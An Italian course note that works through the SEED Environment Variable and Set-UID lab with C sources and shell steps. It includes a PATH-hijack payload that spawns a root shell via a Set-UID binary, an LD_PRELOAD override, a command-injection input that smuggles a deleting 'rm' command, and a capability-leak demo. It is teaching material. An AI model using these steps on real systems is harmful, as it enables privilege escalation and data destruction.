# **UD4 - Laboratorio SEED Environment Variable and Set-UID**

Fonte integrata: `Environment_Variable_and_SetUID.pdf` e archivio `Labsetup-setuid.zip`.

### **1. Obiettivo del laboratorio SEED**

Il laboratorio SEED ha l'obiettivo di mostrare come le variabili d'ambiente influenzano il comportamento di programmi e sistemi, in particolare quando interagiscono con programmi Set-UID.

Gli argomenti coperti sono:

1. variabili d'ambiente;
2. programmi Set-UID;
3. invocazione sicura di programmi esterni;
4. capability leaking;
5. dynamic loader/linker.

> 📌 Il laboratorio non è solo una lista di comandi: serve a dimostrare sperimentalmente che l'ambiente è un canale di input e che i programmi privilegiati devono trattarlo come non fidato.

### **2. Ambiente e file del laboratorio**

Il PDF SEED dichiara che il lab è stato testato sulla VM SEED Ubuntu 20.04. I file necessari sono in `Labsetup-setuid.zip`, che nel repository contiene:

```text
Labsetup/cap_leak.c
Labsetup/catall.c
Labsetup/myenv.c
Labsetup/myprintenv.c
Labsetup/.cap_leak.c.swp
```

Il file `.swp` è un file temporaneo di Vim e non serve al laboratorio.

### **3. Task 1: manipolare variabili d'ambiente**

Comandi da usare:

```bash
printenv
env
printenv PWD
env | grep PWD
export LABVAR=hello
printenv LABVAR
unset LABVAR
printenv LABVAR
```

Osservazione attesa:

1. `printenv` ed `env` mostrano l'ambiente esportato;
2. `export` crea o esporta una variabile verso i figli;
3. `unset` rimuove la variabile;
4. `export` e `unset` sono built-in della shell, non eseguibili esterni.

### **4. Task 2: passaggio dell'ambiente da padre a figlio**

Sorgente `myprintenv.c`:

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

void printenv()
{
  int i = 0;
  while (environ[i] != NULL) {
     printf("%s\n", environ[i]);
     i++;
  }
}

void main()
{
  pid_t childPid;
  switch(childPid = fork()) {
    case 0:
      printenv();
      exit(0);
    default:
      // printenv();
      exit(0);
  }
}
```

Passi:

```bash
gcc myprintenv.c -o myprintenv
./myprintenv > child.env
```

Poi si commenta `printenv()` nel ramo figlio, si decommenta quella nel ramo padre:

```bash
gcc myprintenv.c -o myprintenv
./myprintenv > parent.env
diff child.env parent.env
```

Conclusione: il figlio creato con `fork()` eredita l'ambiente del padre.

### **5. Task 3: ambiente e `execve()`**

Sorgente `myenv.c`:

```c
#include <unistd.h>

extern char **environ;

int main()
{
  char *argv[2];

  argv[0] = "/usr/bin/env";
  argv[1] = NULL;

  execve("/usr/bin/env", argv, NULL);

  return 0 ;
}
```

Con:

```c
execve("/usr/bin/env", argv, NULL);
```

il nuovo programma non riceve l'ambiente.

Con:

```c
execve("/usr/bin/env", argv, environ);
```

il nuovo programma riceve l'ambiente corrente.

> 📌 `execve()` è il punto di controllo: il terzo argomento decide quale ambiente vede il programma eseguito.

### **6. Task 4: ambiente e `system()`**

Programma:

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    system("/usr/bin/env");
    return 0 ;
}
```

`system()` invoca `/bin/sh -c comando`; la shell riceve l'ambiente del processo chiamante e lo passa al comando.

Conclusione: rispetto a `execve()`, `system()` introduce una shell intermedia e aumenta la superficie d'attacco.

### **7. Task 5: variabili d'ambiente e programmi Set-UID**

Programma:

```c
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

int main()
{
    int i = 0;
    while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
    }
}
```

Compilazione e Set-UID:

```bash
gcc printenv.c -o foo
sudo chown root:root foo
sudo chmod 4755 foo
```

Da utente normale:

```bash
export PATH=/tmp:$PATH
export LD_LIBRARY_PATH=/tmp
export ANY_NAME=demo
./foo
```

Da osservare:

1. variabili ordinarie come `ANY_NAME` arrivano al processo;
2. `PATH` può arrivare e influenzare comandi successivi;
3. variabili `LD_*` possono essere filtrate o ignorate dal dynamic loader in modalità Set-UID.

### **8. Task 6: attacco `PATH` contro Set-UID**

Programma vulnerabile:

```c
#include <stdlib.h>

int main()
{
    system("ls");
    return 0;
}
```

Setup:

```bash
gcc myls.c -o myls
sudo chown root:root myls
sudo chmod 4755 myls
```

Payload:

```bash
mkdir -p /tmp/evil
cat > /tmp/evil/ls << 'EOF'
#!/bin/sh
/bin/sh
EOF
chmod +x /tmp/evil/ls
export PATH=/tmp/evil:$PATH
./myls
```

Se la shell invocata da `/bin/sh` mantiene l'EUID, il falso `ls` viene eseguito con privilegi del programma Set-UID.

Il PDF nota che su Ubuntu 20.04 `/bin/sh` punta a `dash`, che può declassare i privilegi in processi Set-UID. Per osservare l'attacco nella VM SEED si può usare:

```bash
sudo ln -sf /bin/zsh /bin/sh
```

> ⚠️ Questa modifica va eseguita solo in VM snapshot. Cambiare `/bin/sh` può alterare molti script di sistema.

### **9. Task 7: `LD_PRELOAD` e programmi Set-UID**

Libreria malevola/dimostrativa:

```c
#include <stdio.h>

void sleep (int s)
{
    printf("I am not sleeping!\n");
}
```

Compilazione:

```bash
gcc -fPIC -g -c mylib.c
gcc -shared -o libmylib.so.1.0.1 mylib.o -lc
export LD_PRELOAD=./libmylib.so.1.0.1
```

Programma:

```c
#include <unistd.h>

int main()
{
    sleep(1);
    return 0;
}
```

Scenari da provare:

1. programma normale, utente normale;
2. programma Set-UID root, utente normale;
3. programma Set-UID root, `LD_PRELOAD` esportata da root;
4. programma Set-UID di `user1`, eseguito da un altro utente.

Conclusione: il dynamic loader tratta diversamente i casi in cui EUID e RUID differiscono e non si limita a ereditare ciecamente le variabili `LD_*`.

### **10. Task 8: `system()` contro `execve()`**

Sorgente `catall.c`:

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
  char *v[3];
  char *command;

  if(argc < 2) {
    printf("Please type a file name.\n");
    return 1;
  }

  v[0] = "/bin/cat"; v[1] = argv[1]; v[2] = NULL;

  command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
  sprintf(command, "%s %s", v[0], v[1]);

  system(command);
  // execve(v[0], v, NULL);

  return 0 ;
}
```

Con `system(command)`, input come:

```bash
./catall "file.txt; rm /tmp/test"
```

può far interpretare alla shell un secondo comando.

Con:

```c
execve(v[0], v, NULL);
```

l'input resta argomento di `/bin/cat` e non diventa sintassi shell.

### **11. Task 9: capability leaking**

Sorgente `cap_leak.c`:

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

void main()
{
  int fd;
  char *v[2];

  fd = open("/etc/zzz", O_RDWR | O_APPEND);
  if (fd == -1) {
     printf("Cannot open /etc/zzz\n");
     exit(0);
  }

  printf("fd is %d\n", fd);

  setuid(getuid());

  v[0] = "/bin/sh"; v[1] = 0;
  execve(v[0], v, 0);
}
```

Setup:

```bash
sudo touch /etc/zzz
sudo chown root:root /etc/zzz
sudo chmod 0644 /etc/zzz
gcc cap_leak.c -o cap_leak
sudo chown root:root cap_leak
sudo chmod 4755 cap_leak
./cap_leak
```

Se il programma stampa `fd is 3`, nella shell avviata:

```bash
echo "scrittura tramite descriptor" >&3
```

La scrittura sfrutta il descriptor aperto quando il processo aveva EUID root.

Correzione:

```c
close(fd);
setuid(getuid());
```

oppure marcare il descriptor `close-on-exec` se non deve sopravvivere a `execve()`.

### **12. Cosa deve contenere una relazione di laboratorio**

Il PDF richiede una relazione dettagliata con:

1. comandi eseguiti;
2. screenshot o output rilevanti;
3. osservazioni;
4. spiegazione delle osservazioni inattese;
5. frammenti di codice importanti seguiti da commento.

Non basta allegare codice: bisogna spiegare perché l'output dimostra il comportamento del sistema.

> ✅ **Ricapitolando** - Il laboratorio SEED verifica sperimentalmente la propagazione dell'ambiente con `fork()`, il controllo esplicito di `execve()`, il rischio di `system()`, l'interazione tra Set-UID e variabili d'ambiente, la mitigazione del dynamic linker sulle variabili `LD_*`, e il capability leaking tramite file descriptor privilegiati. È il ponte operativo tra teoria del controllo accessi e attacchi pratici da esame.

Collegamenti: [L3 - Variabili d'ambiente nei processi Unix](L3%20-%20Variabili%20d'ambiente%20nei%20processi%20Unix.md), [L4 - Attacchi a programmi Set-UID tramite ambiente e PATH](L4%20-%20Attacchi%20a%20programmi%20Set-UID%20tramite%20ambiente%20e%20PATH.md), [L5 - Dynamic linker, LD_PRELOAD e capability leaking](L5%20-%20Dynamic%20linker,%20LD_PRELOAD%20e%20capability%20leaking.md).
